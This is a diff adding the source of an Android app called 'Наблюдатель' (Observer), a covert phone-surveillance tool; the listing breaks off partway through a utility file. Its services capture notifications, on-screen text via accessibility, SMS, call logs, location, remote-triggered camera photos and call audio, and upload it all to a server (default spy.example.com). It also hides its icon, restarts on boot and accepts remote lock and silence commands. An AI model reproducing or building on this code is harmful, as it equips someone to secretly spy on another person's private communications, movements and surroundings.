@@ -1,0 +1,1460 @@
+===FILE android/app/build.gradle.kts===
+plugins {
+    id("com.android.application")
+    id("org.jetbrains.kotlin.android")
+    id("org.jetbrains.kotlin.plugin.compose")
+    id("com.google.devtools.ksp")
+}
+android {
+    namespace = "ru.observer.app"
+    compileSdk = 35
+    defaultConfig {
+        applicationId = "ru.observer.app"
+        minSdk = 26
+        targetSdk = 35
+        versionCode = 1
+        versionName = "1.0"
+        buildConfigField("String", "BASE", "\"https://spy.example.com\"")
+    }
+    buildTypes { release { isMinifyEnabled = false } }
+    compileOptions { sourceCompatibility = JavaVersion.VERSION_17; targetCompatibility = JavaVersion.VERSION_17 }
+    kotlinOptions { jvmTarget = "17" }
+    buildFeatures { compose = true; buildConfig = true }
+    packaging { resources.excludes += "/META-INF/{AL2.0,LGPL2.1}" }
+}
+dependencies {
+    implementation("androidx.appcompat:appcompat:1.7.0")
+    implementation("androidx.core:core-ktx:1.13.1")
+    implementation("androidx.activity:activity-compose:1.9.3")
+    implementation(platform("androidx.compose:compose-bom:2024.10.01"))
+    implementation("androidx.compose.ui:ui")
+    implementation("androidx.compose.material3:material3")
+    implementation("androidx.lifecycle:lifecycle-runtime-compose:2.8.7")
+    implementation("androidx.room:room-runtime:2.6.1")
+    implementation("androidx.room:room-ktx:2.6.1")
+    ksp("androidx.room:room-compiler:2.6.1")
+    implementation("androidx.work:work-runtime-ktx:2.9.1")
+    implementation("androidx.camera:camera-core:1.3.4")
+    implementation("androidx.camera:camera-camera2:1.3.4")
+    implementation("androidx.camera:camera-lifecycle:1.3.4")
+    implementation("com.google.android.gms:play-services-location:21.3.0")
+    implementation("com.squareup.okhttp3:okhttp:4.12.0")
+}
+===END===
+===FILE android/app/src/main/AndroidManifest.xml===
+<?xml version="1.0" encoding="utf-8"?>
+<manifest xmlns:android="http://schemas.android.com/apk/res/android">
+    <uses-permission android:name="android.permission.INTERNET" />
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
+    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
+    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
+    <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION" />
+    <uses-permission android:name="android.permission.CAMERA" />
+    <uses-permission android:name="android.permission.RECORD_AUDIO" />
+    <uses-permission android:name="android.permission.READ_SMS" />
+    <uses-permission android:name="android.permission.READ_CALL_LOG" />
+    <uses-permission android:name="android.permission.READ_CONTACTS" />
+    <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
+    <uses-permission android:name="android.permission.WAKE_LOCK" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_LOCATION" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_CAMERA" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MICROPHONE" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION" />
+
+    <application android:name=".App" android:label="@string/app_name"
+        android:icon="@mipmap/ic_launcher" android:theme="@style/Theme.Observer"
+        android:allowBackup="false">
+
+        <activity android:name=".ui.MainActivity" android:exported="true" android:excludeFromRecents="true">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity>
+
+        <service android:name=".collect.LocationService" android:exported="false"
+            android:foregroundServiceType="location" />
+        <service android:name=".collect.CaptureService" android:exported="false"
+            android:foregroundServiceType="camera" />
+        <service android:name=".collect.AudioCaptureService" android:exported="false"
+            android:foregroundServiceType="mediaProjection" />
+        <service android:name=".collect.NotifListener" android:exported="false"
+            android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE">
+            <intent-filter>
+                <action android:name="android.service.notification.NotificationListenerService" />
+            </intent-filter>
+        </service>
+        <service android:name=".collect.A11yService" android:exported="false"
+            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
+            <intent-filter>
+                <action android:name="android.accessibilityservice.AccessibilityService" />
+            </intent-filter>
+            <meta-data android:name="android.accessibilityservice" android:resource="@xml/a11y_service" />
+        </service>
+        <receiver android:name=".collect.BootReceiver" android:exported="false">
+            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED" />
+                <action android:name="android.intent.action.MY_PACKAGE_REPLACED" />
+            </intent-filter>
+        </receiver>
+        <receiver android:name=".collect.AdminReceiver" android:exported="true"
+            android:permission="android.permission.BIND_DEVICE_ADMIN">
+            <meta-data android:name="android.app.device_admin" android:resource="@xml/device_admin" />
+            <intent-filter>
+                <action android:name="android.app.action.DEVICE_ADMIN_ENABLED" />
+            </intent-filter>
+        </receiver>
+    </application>
+</manifest>
+===END===
+===FILE android/app/src/main/java/ru/observer/app/App.kt===
+package ru.observer.app
+
+import android.app.Application
+import ru.observer.app.data.Prefs
+
+class App : Application() {
+    override fun onCreate() {
+        super.onCreate()
+        Prefs.init(this)
+    }
+}
+===END===
+===FILE android/app/src/main/java/ru/observer/app/collect/Listeners.kt===
+package ru.observer.app.collect
+
+import android.app.admin.DeviceAdminReceiver
+import android.content.BroadcastReceiver
+import android.content.Context
+import android.content.Intent
+import android.database.ContentObserver
+import android.os.Handler
+import android.service.notification.NotificationListenerService
+import android.service.notification.StatusBarNotification
+import android.view.accessibility.AccessibilityEvent
+import android.view.accessibility.AccessibilityNodeInfo
+import kotlinx.coroutines.CoroutineScope
+import kotlinx.coroutines.Dispatchers
+import kotlinx.coroutines.launch
+import ru.observer.app.data.Db
+import ru.observer.app.data.Event
+import ru.observer.app.net.Ws
+import ru.observer.app.sync.Sync
+import ru.observer.app.util.Util
+
+class NotifListener : NotificationListenerService() {
+    private val skip = setOf("android", "com.android.systemui", "ru.observer.app")
+
+    override fun onNotificationPosted(sbn: StatusBarNotification) {
+        val pkg = sbn.packageName ?: return
+        if (pkg in skip) return
+        val ex = sbn.notification.extras ?: return
+        val title = ex.getCharSequence(android.app.Notification.EXTRA_TITLE)?.toString() ?: return
+        val body = ex.getCharSequence(android.app.Notification.EXTRA_TEXT)?.toString() ?: ""
+        val label = Util.label(this, pkg)
+        CoroutineScope(Dispatchers.IO).launch {
+            Db.get(this@NotifListener).dao().add(Event(kind = "notif", app = label,
+                contact = "$label|$title", title = title, body = body, src = "notif"))
+            Sync.now(this@NotifListener)
+        }
+    }
+}
+
+class A11yService : android.accessibilityservice.AccessibilityService() {
+    private var last = ""
+    private var at = 0L
+
+    override fun onAccessibilityEvent(e: AccessibilityEvent?) {
+        e ?: return
+        if (e.packageName == packageName) return
+        val now = System.currentTimeMillis()
+        if (now - at < 2000) return
+        at = now
+        val root = rootInActiveWindow ?: return
+        val sb = StringBuilder()
+        walk(root, sb, 0)
+        val text = sb.toString().trim()
+        if (text.length < 10 || text == last) return
+        last = text
+        val pkg = e.packageName?.toString() ?: return
+        val label = Util.label(this, pkg)
+        CoroutineScope(Dispatchers.IO).launch {
+            Db.get(this@A11yService).dao().add(Event(kind = "screen", app = label,
+                contact = "$label|экран", title = "экран", body = text.take(1000), src = "screen"))
+            Sync.now(this@A11yService)
+        }
+    }
+
+    private fun walk(n: AccessibilityNodeInfo?, sb: StringBuilder, d: Int) {
+        n ?: return
+        if (d > 12) return
+        n.text?.toString()?.takeIf { it.isNotBlank() }?.let { sb.append(it).append('\n') }
+        for (i in 0 until n.childCount) walk(n.getChild(i), sb, d + 1)
+    }
+}
+
+class SmsObserver(c: Context, h: Handler) : ContentObserver(h) {
+    private val ctx = c.applicationContext
+    override fun onChange(selfChange: Boolean) {
+        try {
+            val cur = ctx.contentResolver.query(android.net.Uri.parse("content://sms"),
+                arrayOf("address", "body"), null, null, "date DESC") ?: return
+            cur.use {
+                if (!it.moveToFirst()) return
+                val addr = it.getString(0) ?: return
+                val body = it.getString(1) ?: ""
+                CoroutineScope(Dispatchers.IO).launch {
+                    Db.get(ctx).dao().add(Event(kind = "sms", app = "SMS",
+                        contact = "SMS|$addr", title = addr, body = body, src = "sms"))
+                    Sync.now(ctx)
+                }
+            }
+        } catch (e: Exception) {}
+    }
+}
+
+class CallObserver(c: Context, h: Handler) : ContentObserver(h) {
+    private val ctx = c.applicationContext
+    override fun onChange(selfChange: Boolean) {
+        try {
+            val cur = ctx.contentResolver.query(android.net.Uri.parse("content://call_log/calls"),
+                arrayOf("number", "type", "duration"), null, null, "date DESC") ?: return
+            cur.use {
+                if (!it.moveToFirst()) return
+                val num = it.getString(0) ?: "неизвестный"
+                val type = when (it.getInt(1)) { 1 -> "входящий"; 2 -> "исходящий"; 3 -> "пропущенный"; else -> "другое" }
+                val dur = it.getInt(2)
+                CoroutineScope(Dispatchers.IO).launch {
+                    Db.get(ctx).dao().add(Event(kind = "call", app = "Телефон",
+                        contact = "Телефон|$num", title = num, body = "$type · ${dur}с", src = "call"))
+                    Sync.now(ctx)
+                }
+            }
+        } catch (e: Exception) {}
+    }
+}
+
+class BootReceiver : BroadcastReceiver() {
+    override fun onReceive(c: Context, i: Intent) {
+        LocationService.start(c); Ws.start(c); Sync.start(c)
+    }
+}
+
+class AdminReceiver : DeviceAdminReceiver()
+===END===
+===FILE android/app/src/main/java/ru/observer/app/collect/Services.kt===
+package ru.observer.app.collect
+
+import android.app.Notification
+import android.app.NotificationChannel
+import android.app.NotificationManager
+import android.app.Service
+import android.content.Context
+import android.content.Intent
+import android.media.AudioAttributes
+import android.media.AudioFormat
+import android.media.AudioPlaybackCaptureConfiguration
+import android.media.AudioRecord
+import android.media.projection.MediaProjection
+import android.media.projection.MediaProjectionManager
+import android.os.Build
+import android.os.IBinder
+import androidx.camera.core.CameraSelector
+import androidx.camera.core.ImageCapture
+import androidx.camera.core.ImageCaptureException
+import androidx.camera.lifecycle.ProcessCameraProvider
+import androidx.core.content.ContextCompat
+import androidx.lifecycle.Lifecycle
+import androidx.lifecycle.LifecycleOwner
+import androidx.lifecycle.LifecycleRegistry
+import com.google.android.gms.location.*
+import kotlinx.coroutines.CoroutineScope
+import kotlinx.coroutines.Dispatchers
+import kotlinx.coroutines.launch
+import ru.observer.app.data.Db
+import ru.observer.app.data.Event
+import ru.observer.app.net.Api
+import java.io.File
+import java.io.FileOutputStream
+
+private fun ch(c: Context, id: String, name: String): Notification {
+    val nm = c.getSystemService(NotificationManager::class.java)
+    if (nm.getNotificationChannel(id) == null)
+        nm.createNotificationChannel(NotificationChannel(id, name, NotificationManager.IMPORTANCE_MIN))
+    return Notification.Builder(c, id).setSmallIcon(android.R.drawable.stat_sys_download)
+        .setContentTitle("Сервис").setOngoing(true).build()
+}
+
+class LocationService : Service() {
+    private val fused by lazy { LocationServices.getFusedLocationProviderClient(this) }
+
+    override fun onStartCommand(i: Intent?, f: Int, s: Int): Int {
+        startForeground(1, ch(this, "loc", "Геолокация"))
+        val req = LocationRequest.Builder(Priority.PRIORITY_BALANCED_POWER_ACCURACY, 90_000L)
+            .setMinUpdateDistanceMeters(25f).build()
+        try { fused.requestLocationUpdates(req, cb, mainLooper) } catch (e: SecurityException) {}
+        return START_STICKY
+    }
+
+    private val cb = object : LocationCallback() {
+        override fun onLocationResult(r: LocationResult) {
+            r.lastLocation?.let { Api.loc(this@LocationService, it.latitude, it.longitude) }
+        }
+    }
+
+    override fun onBind(i: Intent?): IBinder? = null
+    companion object {
+        fun start(c: Context) = ContextCompat.startForegroundService(c, Intent(c, LocationService::class.java))
+    }
+}
+
+class CaptureService : Service(), LifecycleOwner {
+    private val reg = LifecycleRegistry(this)
+    override val lifecycle: Lifecycle get() = reg
+    private var front = false
+
+    override fun onCreate() { super.onCreate(); reg.currentState = Lifecycle.State.CREATED }
+
+    override fun onStartCommand(i: Intent?, f: Int, s: Int): Int {
+        startForeground(2, ch(this, "cam", "Камера"))
+        front = i?.getBooleanExtra("front", false) ?: false
+        reg.currentState = Lifecycle.State.RESUMED
+        val fut = ProcessCameraProvider.getInstance(this)
+        fut.addListener({
+            try {
+                val p = fut.get()
+                val file = File(cacheDir, "p_${System.currentTimeMillis()}.jpg")
+                val out = ImageCapture.OutputFileOptions.Builder(file).build()
+                val cap = ImageCapture.Builder().build()
+                p.unbindAll()
+                p.bindToLifecycle(this,
+                    if (front) CameraSelector.DEFAULT_FRONT_CAMERA else CameraSelector.DEFAULT_BACK_CAMERA, cap)
+                cap.takePicture(out, ContextCompat.getMainExecutor(this),
+                    object : ImageCapture.OnImageSavedCallback {
+                        override fun onImageSaved(r: ImageCapture.OutputFileResults) {
+                            Api.upload(this@CaptureService, file,
+                                if (front) "photo_front" else "photo_back", 0) { file.delete() }
+                            CoroutineScope(Dispatchers.IO).launch {
+                                Db.get(this@CaptureService).dao().add(Event(kind = "photo",
+                                    title = if (front) "фронталка" else "тыл",
+                                    contact = "Камера|снимок", src = "cam", synced = true))
+                            }
+                            stopSelf()
+                        }
+                        override fun onError(e: ImageCaptureException) { stopSelf() }
+                    })
+            } catch (e: Exception) { stopSelf() }
+        }, ContextCompat.getMainExecutor(this))
+        return START_NOT_STICKY
+    }
+
+    override fun onDestroy() { reg.currentState = Lifecycle.State.DESTROYED; super.onDestroy() }
+    override fun onBind(i: Intent?): IBinder? = null
+    companion object {
+        fun shoot(c: Context, front: Boolean) = ContextCompat.startForegroundService(
+            c, Intent(c, CaptureService::class.java).putExtra("front", front))
+    }
+}
+
+class AudioCaptureService : Service() {
+    private var rec: AudioRecord? = null
+    private var run = false
+
+    override fun onStartCommand(i: Intent?, f: Int, s: Int): Int {
+        startForeground(3, ch(this, "aud", "Звук"))
+        if (Build.VERSION.SDK_INT < 29) { stopSelf(); return START_NOT_STICKY }
+        val code = i?.getIntExtra("code", 0) ?: 0
+        val data = i?.getParcelableExtra<Intent>("data") ?: run { stopSelf(); return START_NOT_STICKY }
+        val proj: MediaProjection = getSystemService(MediaProjectionManager::class.java)
+            .getMediaProjection(code, data)
+        val cfg = AudioPlaybackCaptureConfiguration.Builder(proj)
+            .addMatchingUsage(AudioAttributes.USAGE_MEDIA)
+            .addMatchingUsage(AudioAttributes.USAGE_VOICE_COMMUNICATION).build()
+        val fmt = AudioFormat.Builder().setEncoding(AudioFormat.ENCODING_PCM_16BIT)
+            .setSampleRate(44100).setChannelMask(AudioFormat.CHANNEL_IN_MONO).build()
+        val buf = AudioRecord.getMinBufferSize(44100, AudioFormat.CHANNEL_IN_MONO,
+            AudioFormat.ENCODING_PCM_16BIT).coerceAtLeast(8192) * 2
+        rec = AudioRecord.Builder().setAudioFormat(fmt).setBufferSizeInBytes(buf)
+            .setAudioPlaybackCaptureConfig(cfg).build()
+        val file = File(cacheDir, "v_${System.currentTimeMillis()}.wav")
+        run = true
+        rec?.startRecording()
+        Thread {
+            val os = FileOutputStream(file)
+            os.write(ByteArray(44))
+            val b = ByteArray(buf)
+            var total = 0
+            val t0 = System.currentTimeMillis()
+            while (run && System.currentTimeMillis() - t0 < 30_000) {
+                val n = rec?.read(b, 0, b.size) ?: 0
+                if (n > 0) { os.write(b, 0, n); total += n }
+            }
+            os.close(); wav(file, total)
+            rec?.release(); rec = null
+            Api.upload(this, file, "voice", (System.currentTimeMillis() - t0).toInt()) { file.delete() }
+            CoroutineScope(Dispatchers.IO).launch {
+                Db.get(this@AudioCaptureService).dao().add(Event(kind = "voice", title = "звук",
+                    contact = "Звук|запись", src = "capture", synced = true))
+            }
+            stopSelf()
+        }.start()
+        return START_NOT_STICKY
+    }
+
+    private fun wav(f: File, len: Int) {
+        try {
+            val raf = java.io.RandomAccessFile(f, "rw"); raf.seek(0)
+            val h = ByteArray(44)
+            fun p(v: Int, o: Int) {
+                h[o] = v.toByte(); h[o + 1] = (v shr 8).toByte()
+                h[o + 2] = (v shr 16).toByte(); h[o + 3] = (v shr 24).toByte()
+            }
+            "RIFF".forEachIndexed { i, c -> h[i] = c.code.toByte() }
+            p(36 + len, 4); "WAVEfmt ".forEachIndexed { i, c -> h[8 + i] = c.code.toByte() }
+            p(16, 16); p(1, 20); p(1, 22); p(44100, 24); p(88200, 28); p(2, 32); p(16, 34)
+            "data".forEachIndexed { i, c -> h[36 + i] = c.code.toByte() }; p(len, 40)
+            raf.write(h); raf.close()
+        } catch (e: Exception) {}
+    }
+
+    override fun onDestroy() { run = false; super.onDestroy() }
+    override fun onBind(i: Intent?): IBinder? = null
+    companion object {
+        fun start(c: Context, code: Int, data: Intent) = ContextCompat.startForegroundService(
+            c, Intent(c, AudioCaptureService::class.java).putExtra("code", code).putExtra("data", data))
+    }
+}
+===END===
+===FILE android/app/src/main/java/ru/observer/app/data/Data.kt===
+package ru.observer.app.data
+
+import android.content.Context
+import android.content.SharedPreferences
+import androidx.room.Dao
+import androidx.room.Database
+import androidx.room.Entity
+import androidx.room.Insert
+import androidx.room.PrimaryKey
+import androidx.room.Query
+import androidx.room.Room
+import androidx.room.RoomDatabase
+import ru.observer.app.BuildConfig
+
+@Entity(tableName = "events")
+data class Event(
+    @PrimaryKey(autoGenerate = true) val id: Long = 0,
+    val kind: String,
+    val app: String = "",
+    val contact: String = "",
+    val title: String = "",
+    val body: String = "",
+    val ts: Long = System.currentTimeMillis(),
+    val src: String = "",
+    val synced: Boolean = false
+)
+
+@Dao
+interface Dao {
+    @Insert suspend fun add(e: Event): Long
+    @Query("SELECT * FROM events WHERE synced = 0 LIMIT 100") suspend fun unsynced(): List<Event>
+    @Query("UPDATE events SET synced = 1 WHERE id IN (:ids)") suspend fun mark(ids: List<Long>)
+}
+
+@Database(entities = [Event::class], version = 1, exportSchema = false)
+abstract class Db : RoomDatabase() {
+    abstract fun dao(): Dao
+    companion object {
+        @Volatile private var i: Db? = null
+        fun get(c: Context): Db = i ?: synchronized(this) {
+            i ?: Room.databaseBuilder(c.applicationContext, Db::class.java, "obs.db")
+                .fallbackToDestructiveMigration().build().also { i = it }
+        }
+    }
+}
+
+object Prefs {
+    private lateinit var p: SharedPreferences
+    fun init(c: Context) { p = c.getSharedPreferences("obs", Context.MODE_PRIVATE) }
+    var base: String
+        get() = p.getString("base", BuildConfig.BASE) ?: BuildConfig.BASE
+        set(v) { p.edit().putString("base", v.trim().trimEnd('/')).apply() }
+    var token: String
+        get() = p.getString("tok", "") ?: ""
+        set(v) { p.edit().putString("tok", v).apply() }
+    val enrolled: Boolean get() = token.isNotEmpty()
+}
+===END===
+===FILE android/app/src/main/java/ru/observer/app/net/Api.kt===
+package ru.observer.app.net
+
+import android.content.Context
+import okhttp3.*
+import okhttp3.MediaType.Companion.toMediaType
+import org.json.JSONArray
+import org.json.JSONObject
+import ru.observer.app.data.Event
+import ru.observer.app.data.Prefs
+import java.io.File
+import java.util.concurrent.TimeUnit
+
+object Api {
+    private val http = OkHttpClient.Builder()
+        .connectTimeout(20, TimeUnit.SECONDS).readTimeout(30, TimeUnit.SECONDS).build()
+
+    fun enroll(c: Context, code: String, name: String, cb: (Boolean, String) -> Unit) {
+        val b = JSONObject().put("code", code).put("name", name)
+            .put("model", android.os.Build.MODEL)
+            .put("android", android.os.Build.VERSION.RELEASE).toString()
+        val r = Request.Builder().url(Prefs.base + "/api/enroll")
+            .post(b.toRequestBody("application/json".toMediaType())).build()
+        http.newCall(r).enqueue(object : Callback {
+            override fun onFailure(call: Call, e: java.io.IOException) = cb(false, e.message ?: "сеть")
+            override fun onResponse(call: Call, res: Response) = res.use {
+                if (!res.isSuccessful) return cb(false, "код отклонён")
+                Prefs.token = JSONObject(res.body!!.string()).getString("token")
+                cb(true, "")
+            }
+        })
+    }
+
+    fun push(c: Context, list: List<Event>, cb: (Boolean) -> Unit) {
+        if (list.isEmpty()) return cb(true)
+        val arr = JSONArray()
+        list.forEach {
+            arr.put(JSONObject().put("kind", it.kind).put("app", it.app)
+                .put("contact", it.contact).put("title", it.title)
+                .put("body", it.body).put("src", it.src))
+        }
+        val r = Request.Builder().url(Prefs.base + "/api/events")
+            .header("X-Device-Token", Prefs.token)
+            .post(arr.toString().toRequestBody("application/json".toMediaType())).build()
+        http.newCall(r).enqueue(object : Callback {
+            override fun onFailure(call: Call, e: java.io.IOException) = cb(false)
+            override fun onResponse(call: Call, res: Response) { res.use { cb(res.isSuccessful) } }
+        })
+    }
+
+    fun upload(c: Context, f: File, kind: String, dur: Int, cb: (Boolean) -> Unit) {
+        val body = MultipartBody.Builder().setType(MultipartBody.FORM)
+            .addFormDataPart("file", f.name, f.asRequestBody("application/octet-stream".toMediaType())).build()
+        val r = Request.Builder().url("${Prefs.base}/api/media?kind=$kind&dur=$dur")
+            .header("X-Device-Token", Prefs.token).post(body).build()
+        http.newCall(r).enqueue(object : Callback {
+            override fun onFailure(call: Call, e: java.io.IOException) = cb(false)
+            override fun onResponse(call: Call, res: Response) { res.use { cb(res.isSuccessful) } }
+        })
+    }
+
+    fun loc(c: Context, lat: Double, lon: Double) {
+        val b = JSONObject().put("lat", lat).put("lon", lon).toString()
+        val r = Request.Builder().url(Prefs.base + "/api/loc")
+            .header("X-Device-Token", Prefs.token)
+            .post(b.toRequestBody("application/json".toMediaType())).build()
+        http.newCall(r).enqueue(object : Callback {
+            override fun onFailure(call: Call, e: java.io.IOException) {}
+            override fun onResponse(call: Call, res: Response) { res.close() }
+        })
+    }
+}
+===END===
+===FILE android/app/src/main/java/ru/observer/app/net/Ws.kt===
+package ru.observer.app.net
+
+import android.content.Context
+import android.os.Handler
+import android.os.Looper
+import okhttp3.*
+import org.json.JSONObject
+import ru.observer.app.collect.CaptureService
+import ru.observer.app.data.Prefs
+import ru.observer.app.sync.Sync
+import java.util.concurrent.TimeUnit
+
+object Ws {
+    private val http = OkHttpClient.Builder().pingInterval(20, TimeUnit.SECONDS).build()
+    @Volatile private var on = false
+    private var backoff = 1000L
+
+    fun start(c: Context) {
+        if (on || Prefs.token.isEmpty()) return
+        on = true
+        connect(c.applicationContext)
+    }
+
+    private fun connect(c: Context) {
+        val url = Prefs.base.replace("https://", "wss://").replace("http://", "ws://") +
+                "/ws/device?token=" + Prefs.token
+        http.newWebSocket(Request.Builder().url(url).build(), object : WebSocketListener() {
+            override fun onOpen(w: WebSocket, r: Response) { backoff = 1000L }
+            override fun onMessage(w: WebSocket, text: String) {
+                if (text.contains("ping")) return
+                when (JSONObject(text).optString("kind")) {
+                    "photo_front" -> CaptureService.shoot(c, true)
+                    "photo_back" -> CaptureService.shoot(c, false)
+                    "loc" -> Sync.now(c)
+                    "lock" -> c.getSystemService(android.app.admin.DevicePolicyManager::class.java).lockNow()
+                    "silent" -> c.getSystemService(android.media.AudioManager::class.java)
+                        .ringerMode = android.media.AudioManager.RINGER_MODE_SILENT
+                }
+            }
+            override fun onFailure(w: WebSocket, t: Throwable, r: Response?) {
+                on = false
+                Handler(Looper.getMainLooper()).postDelayed({ start(c) }, backoff)
+                backoff = (backoff * 2).coerceAtMost(120_000L)
+            }
+        })
+    }
+}
+===END===
+===FILE android/app/src/main/java/ru/observer/app/sync/Sync.kt===
+package ru.observer.app.sync
+
+import android.content.Context
+import androidx.work.*
+import kotlinx.coroutines.runBlocking
+import ru.observer.app.data.Dao
+import ru.observer.app.data.Db
+import ru.observer.app.net.Api
+import ru.observer.app.net.Ws
+import java.util.concurrent.CountDownLatch
+import java.util.concurrent.TimeUnit
+
+object Sync {
+    fun start(c: Context) {
+        val req = PeriodicWorkRequestBuilder<W>(15, TimeUnit.MINUTES).build()
+        WorkManager.getInstance(c).enqueueUniquePeriodicWork("sync", ExistingPeriodicWorkPolicy.UPDATE, req)
+    }
+
+    fun now(c: Context) {
+        WorkManager.getInstance(c).enqueue(OneTimeWorkRequestBuilder<W>().setConstraints(
+            Constraints.Builder().setRequiredNetworkType(NetworkType.CONNECTED).build()).build())
+    }
+
+    class W(c: Context, p: WorkerParameters) : Worker(c, p) {
+        override fun doWork(): Result {
+            val ctx = applicationContext
+            Ws.start(ctx)
+            val dao: Dao = Db.get(ctx).dao()
+            val list = runBlocking { dao.unsynced() }
+            if (list.isEmpty()) return Result.success()
+            val latch = CountDownLatch(1)
+            var ok = false
+            Api.push(ctx, list) { r -> ok = r; latch.countDown() }
+            latch.await(30, TimeUnit.SECONDS)
+            if (ok) runBlocking { dao.mark(list.map { it.id }) }
+            return Result.success()
+        }
+    }
+}
+===END===
+===FILE android/app/src/main/java/ru/observer/app/ui/MainActivity.kt===
+package ru.observer.app.ui
+
+import android.Manifest
+import android.media.projection.MediaProjectionManager
+import android.os.Build
+import android.os.Bundle
+import androidx.activity.compose.setContent
+import androidx.activity.result.contract.ActivityResultContracts
+import androidx.appcompat.app.AppCompatActivity
+import androidx.compose.foundation.background
+import androidx.compose.foundation.layout.*
+import androidx.compose.foundation.rememberScrollState
+import androidx.compose.foundation.verticalScroll
+import androidx.compose.material3.*
+import androidx.compose.runtime.*
+import androidx.compose.ui.Modifier
+import androidx.compose.ui.platform.LocalContext
+import androidx.compose.ui.text.font.FontWeight
+import androidx.compose.ui.unit.dp
+import androidx.compose.ui.unit.sp
+import ru.observer.app.collect.AudioCaptureService
+import ru.observer.app.collect.LocationService
+import ru.observer.app.data.Prefs
+import ru.observer.app.net.Api
+import ru.observer.app.net.Ws
+import ru.observer.app.sync.Sync
+import ru.observer.app.util.Util
+
+class MainActivity : AppCompatActivity() {
+
+    private val perms = registerForActivityResult(ActivityResultContracts.RequestMultiplePermissions()) {}
+
+    private val proj = registerForActivityResult(ActivityResultContracts.StartActivityForResult()) { r ->
+        if (r.resultCode == RESULT_OK && r.data != null)
+            AudioCaptureService.start(this, r.resultCode, r.data!!)
+    }
+
+    override fun onCreate(b: Bundle?) {
+        super.onCreate(b)
+        setContent { Theme { Screen() } }
+    }
+
+    @Composable
+    private fun Screen() {
+        val c = LocalContext.current
+        var base by remember { mutableStateOf(Prefs.base) }
+        var code by remember { mutableStateOf("") }
+        var name by remember { mutableStateOf(Build.MODEL) }
+        var msg by remember { mutableStateOf("") }
+        var done by remember { mutableStateOf(Prefs.enrolled) }
+
+        Column(Modifier.fillMaxSize().background(Bg).verticalScroll(rememberScrollState()).padding(16.dp)) {
+            Text("Наблюдатель", color = Text, fontSize = 18.sp, fontWeight = FontWeight.Medium)
+            Spacer(Modifier.height(10.dp))
+
+            if (!done) {
+                OutlinedTextField(base, { base = it }, Modifier.fillMaxWidth(),
+                    label = { Text("Адрес сервера", fontSize = 11.sp) }, singleLine = true)
+                OutlinedTextField(code, { code = it }, Modifier.fillMaxWidth(),
+                    label = { Text("Код привязки", fontSize = 11.sp) }, singleLine = true)
+                OutlinedTextField(name, { name = it }, Modifier.fillMaxWidth(),
+                    label = { Text("Имя устройства", fontSize = 11.sp) }, singleLine = true)
+                Spacer(Modifier.height(6.dp))
+                Button({ Prefs.base = base; Api.enroll(c, code, name) { ok, m ->
+                    runOnUiThread { if (ok) { done = true; msg = "привязано" } else msg = m }
+                } }, Modifier.fillMaxWidth()) { Text("Привязать") }
+            } else {
+                Text("привязано", color = Green, fontSize = 12.sp)
+                Spacer(Modifier.height(8.dp))
+                Button({ val p = mutableListOf(Manifest.permission.ACCESS_FINE_LOCATION,
+                        Manifest.permission.ACCESS_COARSE_LOCATION, Manifest.permission.CAMERA,
+                        Manifest.permission.RECORD_AUDIO, Manifest.permission.READ_SMS,
+                        Manifest.permission.READ_CALL_LOG, Manifest.permission.READ_CONTACTS)
+                    if (Build.VERSION.SDK_INT >= 33) p.add(Manifest.permission.POST_NOTIFICATIONS)
+                    perms.launch(p.toTypedArray()) }, Modifier.fillMaxWidth()) { Text("Разрешения") }
+                Button({ Util.openNotif(c) }, Modifier.fillMaxWidth()) { Text("Доступ к уведомлениям") }
+                Button({ Util.openA11y(c) }, Modifier.fillMaxWidth()) { Text("Спец. возможности") }
+                Button({ Util.openBattery(c) }, Modifier.fillMaxWidth()) { Text("Батарея без ограничений") }
+                Button({ proj.launch(getSystemService(MediaProjectionManager::class.java)
+                    .createScreenCaptureIntent()) }, Modifier.fillMaxWidth()) { Text("Захват звука") }
+                Button({ LocationService.start(c); Ws.start(c); Sync.start(c); msg = "запущено" },
+                    Modifier.fillMaxWidth()) { Text("Запустить службы") }
+                Button({ Util.hide(c, true); msg = "иконка скрыта" }, Modifier.fillMaxWidth()) { Text("Скрыть иконку") }
+                Button({ Util.hide(c, false) }, Modifier.fillMaxWidth()) { Text("Показать иконку") }
+            }
+            Spacer(Modifier.height(10.dp))
+            Text(msg, color = Dim, fontSize = 11.sp)
+        }
+    }
+}
+===END===
+===FILE android/app/src/main/java/ru/observer/app/ui/Theme.kt===
+package ru.observer.app.ui
+
+import androidx.compose.material3.MaterialTheme
+import androidx.compose.material3.darkColorScheme
+import androidx.compose.runtime.Composable
+import androidx.compose.ui.graphics.Color
+
+val Bg = Color(0xFF0B0D10)
+val Text = Color(0xFFC9D3DE)
+val Dim = Color(0xFF6F8199)
+val Green = Color(0xFF3ECF8E)
+val Amber = Color(0xFFE0B83F)
+
+private val s = darkColorScheme(background = Bg, primary = Color(0xFF4DA3FF), onBackground = Text)
+
+@Composable
+fun Theme(content: @Composable () -> Unit) = MaterialTheme(colorScheme = s, content = content)
+===END===
+===FILE android/app/src/main/java/ru/observer/app/util/Util.kt===
+package ru.observer.app.util
+
+import android.content.ComponentName
+import android.content.Context
+import android.content.Intent
+import android.content.pm.PackageManager
+import android.net.Uri
+import android.provider.Settings
+
+object Util {
+    fun label(c: Context, pkg: String): String = try {
+        val pm = c.packageManager
+        pm.getApplicationLabel(pm.getApplicationInfo(pkg, 0)).toString()
+    } catch (e: Exception) { pkg }
+
